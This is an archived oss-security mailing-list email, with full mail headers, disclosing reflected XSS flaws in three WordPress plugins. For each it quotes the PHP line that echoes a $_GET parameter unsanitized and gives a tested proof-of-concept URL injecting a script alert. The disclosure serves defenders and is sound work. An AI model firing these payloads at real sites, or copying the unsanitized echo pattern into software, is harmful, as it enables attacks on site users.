X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2250" "Wednesday" "11" "May" "2016" "12:28:33" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<1E5802AD-8BE2-42C4-BA73-9773050C1FA5@me.com>" "59" "[oss-security] Reflected XSS in three Wordpress plugins." nil nil nil "5" "2016051116:28:33" "[oss-security] Reflected XSS in three Wordpress plugins." (number mark "U       larry0@me.co May 11   59/2250  " thread-indent "\"[oss-security] Reflected XSS in three Wordpress plugins.\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 25843 invoked by uid 550); 11 May 2016 16:28:56 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 25784 invoked from network); 11 May 2016 16:28:48 -0000
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-05-11_05:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1510270003 definitions=main-1605110219
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=us-ascii
Content-transfer-encoding: quoted-printable
Message-id: <1E5802AD-8BE2-42C4-BA73-9773050C1FA5@me.com>
Date: Wed, 11 May 2016 12:28:33 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1462984116; bh=7W60CTCkGEss9j/Y5b8lyo9pLR+7dYF50O66WHKLyj8=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=kEa1Gdx1d5myXoIbHtUme/DWobQPy3I5Vnowr1PZzCa1CqfDsFaDrQ0rO6rWxaCOX
 NipCnUxAWbOxAyYKx7G92/hxENkGsFMHm7I1bXJJRoOfUO7myvm7DON3OJuD/JqKFe
 pcbHcoUWewMaAxdrQmZBeKkkf4mZHtR204YBsZlHFOVTvcCv/B2UEQ5T3t8E9G4Cro
 OA4h32sOdbkeTSdZjvEHn/ce7Al38Y/ENp2Gt14uVW6L5Rxya3EEzcVOFpcGkeFpyW
 iOIHgMRQ0dUbNQFmjZ1J6kqo63dBWgVhQuClbq/mlUdAtgsS8C1kF0GFJ3qY4Jg+ux
 kG9MmteHHqLUQ==
Subject: [oss-security] Reflected XSS in three Wordpress plugins.

Hello List,

I've manually confirmed these vulnerabilities:

Title: Reflected XSS in wordpress plugin enhanced-tooltipglossary v3.2.8
Date: 2016-02-09
Download Site: https://wordpress.org/plugins/enhanced-tooltipglossary
Vulnerability:
There is a reflected XSS vulnerability in the following php code ./enhanced=
-tooltipglossary/backend/views/admin_importexport.php:
19:        ?> (<?php echo $_GET['itemsnumber']; ?> items read from file)</d=
iv>
The variable itemsnumber appears to send unsanitized data back to the users=
 browser.
DWF-2016-77246
PoC:
This is a tested exploit:
http://[target]/wp-content/plugins/enhanced-tooltipglossary/backend/views/a=
dmin_importexport.php?itemsnumber=3D<script>alert(1)</script>&msg=3Dimported
Advisory: http://www.vapidlabs.com/wp/wp_advisory.php?v=3D37


Title: Reflected XSS in wordpress plugin tera-charts v1.0
Date: 2016-02-09
Download Site: https://wordpress.org/plugins/tera-charts (removed by WP)
Vulnerability:
There is a reflected XSS vulnerability in the following php code ./tera-cha=
rts/charts/treemap.php:
52:    var data_filename =3D "<?php echo $_GET['fn']; ?>";
55:    var chart_userid =3D "<?php echo $_GET['userid']; ?>";
The variable fn appears to send unsanitized data back to the users browser.
DWF-2016-77716
PoC:
This is a tested exploit:
http://wp-site/tera-charts/charts/treemap.php?fn=3D";</script><script>alert=
(1);</script><script>"&userid=3D1
Advisory: http://www.vapidlabs.com/wp/wp_advisory.php?v=3D455


Title: Reflected XSS in wordpress plugin pondol-carousel v1.0 (no response =
from author)
Date: 2016-02-09
Download Site: https://wordpress.org/plugins/pondol-carousel
Vulnerability:
There is a reflected XSS vulnerability in the following php code ./pondol-c=
arousel/pages/admin_create.php:
5:	var itemid	=3D "<?php echo $_GET["itemid"];?>";
The variable itemid appears to send unsanitized data back to the users brow=
ser.
DWF-2016-77531
PoC:
This is a tested exploit:
http://wp-sitehttp://192.168.0.115/pondol-carousel/pages/admin_create.php?i=
temid=3D";</script><script>alert(1);</script>"
Advisory: http://www.vapidlabs.com/wp/wp_advisory.php?v=3D524


For more information on DWF assignments see https://github.com/distributedw=
eaknessfiling/DWF-Documentation=
